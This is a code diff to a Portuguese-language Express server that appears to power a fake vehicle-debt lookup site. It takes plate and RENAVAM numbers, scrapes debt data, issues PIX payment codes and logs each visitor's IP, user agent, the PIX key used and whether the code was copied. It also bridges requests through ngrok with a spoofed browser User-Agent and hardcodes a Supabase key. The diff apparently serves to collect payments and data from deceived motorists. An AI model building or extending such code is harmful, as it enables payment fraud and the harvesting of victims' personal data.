@@ -12,12 +12,12 @@ const { createClient } = require('@supabase/supabase-js');
 const app = express();
 const PORT = process.env.PORT || 3001;
 
-// 🔥 CONFIGURAÇÃO DO SUPABASE (USANDO O QUE VOCÊ CRIOU)
+// 🔥 CONFIGURAÇÃO DO SUPABASE
 const SUPABASE_URL = 'https://wpmvbvbrsggkbaycpvlq.supabase.co';
 const SUPABASE_ANON_KEY = 'sb_publishable_7WuOJyAKV7E2tuim-6Sp7g_JPsVWMEf';
 const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-// 🔥 SEU LINK DO NGROK (ATUALIZADO)
+// 🔥 SEU LINK DO NGROK
 const NGROK_URL = 'https://subtitle-flyer-unreached.ngrok-free.dev';
 
 app.set('trust proxy', true);
@@ -39,19 +39,31 @@ app.use(express.static(__dirname));
 
 async function registrarClique(ip, userAgent, pagina) {
     try {
-        await supabase.from('clicks').insert({ ip, user_agent: userAgent, pagina });
+        const { error } = await supabase.from('clicks').insert({ 
+            ip, 
+            user_agent: userAgent, 
+            pagina 
+        });
+        if (error) console.error('Erro Supabase (clique):', error.message);
     } catch (e) { console.error('Erro ao registrar clique:', e.message); }
 }
 
 async function registrarConsulta(placa, renavam, ip, userAgent) {
     try {
-        await supabase.from('consultas').insert({ placa, renavam, ip, user_agent: userAgent });
+        const { error } = await supabase.from('consultas').insert({ 
+            placa, 
+            renavam, 
+            ip, 
+            user_agent: userAgent 
+        });
+        if (error) console.error('Erro Supabase (consulta):', error.message);
+        else console.log('✅ Consulta salva no Supabase!');
     } catch (e) { console.error('Erro ao registrar consulta:', e.message); }
 }
 
 async function registrarPIXGerado(pixId, placa, valor, debitos, copiacola, ip, userAgent, chave) {
     try {
-        await supabase.from('pix_gerados').insert({
+        const { error } = await supabase.from('pix_gerados').insert({
             pix_id: pixId,
             placa,
             valor,
@@ -61,12 +73,14 @@ async function registrarPIXGerado(pixId, placa, valor, debitos, copiacola, ip, u
             user_agent: userAgent,
             chave_utilizada: chave
         });
+        if (error) console.error('Erro Supabase (PIX):', error.message);
     } catch (e) { console.error('Erro ao registrar PIX:', e.message); }
 }
 
 async function marcarPIXCopiado(pixId) {
     try {
-        await supabase.from('pix_gerados').update({ copiado: true }).eq('pix_id', pixId);
+        const { error } = await supabase.from('pix_gerados').update({ copiado: true }).eq('pix_id', pixId);
+        if (error) console.error('Erro Supabase (copiar PIX):', error.message);
     } catch (e) { console.error('Erro ao marcar PIX copiado:', e.message); }
 }
 
@@ -78,7 +92,13 @@ async function marcarPagamentoConfirmado(pixId, placa, renavam, ip, userAgent) {
         if (placa && renavam) {
             await supabase.from('consultas').update({ pagamento_confirmado: true }).eq('placa', placa).eq('renavam', renavam);
         }
-        await supabase.from('pagamentos_confirmados').insert({ pix_id: pixId, placa, renavam, ip, user_agent: userAgent });
+        await supabase.from('pagamentos_confirmados').insert({ 
+            pix_id: pixId, 
+            placa, 
+            renavam, 
+            ip, 
+            user_agent: userAgent 
+        });
     } catch (e) { console.error('Erro ao confirmar pagamento:', e.message); }
 }
 
@@ -156,35 +176,7 @@ app.get('/index.html', async (req, res) => {
 });
 
 // ============================================================
-// 🔥 ROTA DE CONSULTA (VIA NGROK)
-// ============================================================
-app.post('/api/consultar-ngrok', async (req, res) => {
-    try {
-        console.log('📥 Requisição recebida via Ngrok!');
-        console.log('📦 Body:', req.body);
-        
-        // 🔥 REPASSA PARA O SEU SERVIDOR LOCAL (NGROK)
-        const response = await axios.post(`${NGROK_URL}/api/consultar`, req.body, {
-            headers: {
-                'Content-Type': 'application/json',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-            },
-            timeout: 30000
-        });
-        
-        console.log('✅ Resposta do Ngrok recebida!');
-        return res.json(response.data);
-    } catch (error) {
-        console.error('❌ Erro ao chamar Ngrok:', error.message);
-        return res.status(500).json({
-            sucesso: false,
-            erro: 'Erro na ponte com o servidor local: ' + error.message
-        });
-    }
-});
-
-// ============================================================
-// 🔥 ROTA DE CONSULTA LOCAL (RODA NO SEU PC)
+// 🔥 ROTA DE CONSULTA
 // ============================================================
 app.post('/api/consultar', async (req, res) => {
     const { placa, renavam } = req.body;
@@ -239,7 +231,6 @@ app.post('/api/consultar', async (req, res) => {
             console.log('⚠️ API direta falhou, usando HTML...');
         }
 
-        // 🔥 BAIXA A PÁGINA DE RESULTADO
         const chars = 'abcdefghijkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789';
         let slug = '';
         for (let i = 0; i < 6; i++) {
@@ -262,7 +253,6 @@ app.post('/api/consultar', async (req, res) => {
         const html = resultResponse.data;
         const $ = cheerio.load(html);
 
-        // 🔥 EXTRAI DADOS DO VEÍCULO
         const veiculo = {
             placa: placaLimpa,
             marca_modelo: $('#scFieldMarcaModelo').text().trim() || dadosVeiculo.marca_modelo || '-',
@@ -276,7 +266,6 @@ app.post('/api/consultar', async (req, res) => {
 
         console.log(`📊 Veículo: ${veiculo.marca_modelo}, ${veiculo.ano}`);
 
-        // 🔥 EXTRAI DÉBITOS
         const debitos = [];
         let totalDebitos = 0;
 
@@ -339,6 +328,33 @@ app.post('/api/consultar', async (req, res) => {
         return res.status(500).json({ 
             sucesso: false, 
             erro: 'Erro ao processar a consulta. Tente novamente.' 
+        });
+    }
+});
+
+// ============================================================
+// 🔥 ROTA PARA A VERCEL CHAMAR O NGROK (PONTE)
+// ============================================================
+app.post('/api/consultar-ngrok', async (req, res) => {
+    try {
+        console.log('📥 Requisição recebida via Ngrok!');
+        console.log('📦 Body:', req.body);
+        
+        const response = await axios.post(`${NGROK_URL}/api/consultar`, req.body, {
+            headers: {
+                'Content-Type': 'application/json',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            },
+            timeout: 30000
+        });
+        
+        console.log('✅ Resposta do Ngrok recebida!');
+        return res.json(response.data);
+    } catch (error) {
+        console.error('❌ Erro ao chamar Ngrok:', error.message);
+        return res.status(500).json({
+            sucesso: false,
+            erro: 'Erro na ponte com o servidor local: ' + error.message
         });
     }
 });
@@ -459,7 +475,7 @@ app.get('/admin.html', (req, res) => {
 });
 
 // ============================================================
-// ROTAS DO ADMIN (COM SUPABASE)
+// ROTAS DO ADMIN
 // ============================================================
 app.get('/api/admin/dashboard', async (req, res) => {
     if (!req.session.loggedIn) return res.status(401).json({ erro: 'Não autorizado' });
